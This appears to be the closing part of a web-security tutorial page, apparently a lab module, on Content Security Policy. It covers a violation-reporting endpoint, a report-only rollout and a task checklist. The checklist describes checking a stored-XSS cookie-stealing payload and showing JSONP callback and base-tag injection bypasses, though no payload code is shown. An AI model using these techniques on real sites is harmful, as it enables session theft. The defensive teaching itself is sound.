app.<span class="fn">post</span>(<span class="str">'/csp-report'</span>,
  express.<span class="fn">json</span>({ type: <span class="str">'application/csp-report'</span> }),
  (<span class="fn">req</span>, <span class="fn">res</span>) <span class="op">=></span> {
    <span class="kw">const</span> report = req.body[<span class="str">'csp-report'</span>] || req.body;
    console.<span class="fn">warn</span>(<span class="str">'CSP Violation:'</span>, {
      blockedUri: report[<span class="str">'blocked-uri'</span>],
      violatedDirective: report[<span class="str">'violated-directive'</span>],
      documentUri: report[<span class="str">'document-uri'</span>],
      sourceFile: report[<span class="str">'source-file'</span>],
      lineNumber: report[<span class="str">'line-number'</span>]
    });

    <span class="cmt">// In production, send to your logging/alerting system</span>
    <span class="cmt">// logToSIEM(report);</span>
    <span class="cmt">// alertIfSuspicious(report);</span>

    res.<span class="fn">status</span>(<span class="num">204</span>).<span class="fn">end</span>();
  }
);
  </pre>
</div>

<p>
  When deploying CSP for the first time on an existing application, use <code>Content-Security-Policy-Report-Only</code>
  instead of <code>Content-Security-Policy</code>. This tells the browser to report violations but not actually
  block anything. It is CSP in audit mode. Deploy it, collect reports for a week, fix any legitimate resources
  that the policy would block, and then switch to enforcement mode.
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">Report-Only Mode for Safe Rollout</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="cmt">// Phase 1: Report only (no blocking)</span>
res.<span class="fn">setHeader</span>(<span class="str">'Content-Security-Policy-Report-Only'</span>, policy);

<span class="cmt">// Phase 2: After fixing all legitimate violations, enforce</span>
res.<span class="fn">setHeader</span>(<span class="str">'Content-Security-Policy'</span>, policy);
  </pre>
</div>

<div class="callout warn">
  <div class="callout-title">CSP Reporting Volume</div>
  <div class="callout-text">
    CSP reports can generate enormous volume, especially if browser extensions inject scripts that violate your
    policy. Every user with an ad blocker, password manager, or accessibility extension will generate reports
    for scripts your policy did not whitelist. You need to filter out extension-related reports (they typically
    have <code>source-file</code> values starting with <code>chrome-extension://</code> or <code>moz-extension://</code>)
    and rate-limit your reporting endpoint to avoid overwhelming your logging infrastructure.
  </div>
</div>

<p>
  A well-monitored CSP does three things for you. First, it tells you when an actual XSS attack is being
  attempted -- you will see reports for blocked inline scripts and blocked external script loads. Second, it
  tells you when your own developers accidentally break the policy by adding an inline script or loading a
  resource from an unwhitelisted domain. Third, it gives you confidence that your policy is working. If you
  are getting zero reports, either everything is fine or your reporting is broken. Add a synthetic test that
  intentionally triggers a violation to verify the pipeline is working.
</p>

<hr>

<h2>Task Checklist</h2>

<ul class="task-list">
  <li><span class="task-check"></span> Build the comment app with stored XSS and verify the cookie-stealing payload works with no CSP</li>
  <li><span class="task-check"></span> Add a CSP with <code>script-src 'self' 'unsafe-inline'</code> and confirm the XSS payload still executes</li>
  <li><span class="task-check"></span> Create a JSONP endpoint and demonstrate the callback injection bypass against <code>script-src 'self'</code></li>
  <li><span class="task-check"></span> Exploit the missing <code>base-uri</code> directive with a <code>&lt;base&gt;</code> tag injection</li>
  <li><span class="task-check"></span> Test the CSP meta tag override attack and verify HTTP header delivery prevents it</li>
  <li><span class="task-check"></span> Deploy a strict nonce-based CSP with <code>strict-dynamic</code> and verify all four attacks are blocked</li>
  <li><span class="task-check"></span> Set up the CSP violation reporting endpoint and trigger a test violation to confirm reports arrive</li>
  <li><span class="task-check"></span> Deploy in <code>Content-Security-Policy-Report-Only</code> mode first, then switch to enforcement</li>
</ul>

<div class="section-nav">
  <button class="nav-btn" data-prev="cors">Back: CORS Misconfiguration</button>
  <button class="nav-btn" data-next="ratelimit">Next: Rate-Limiting</button>
</div>

`;
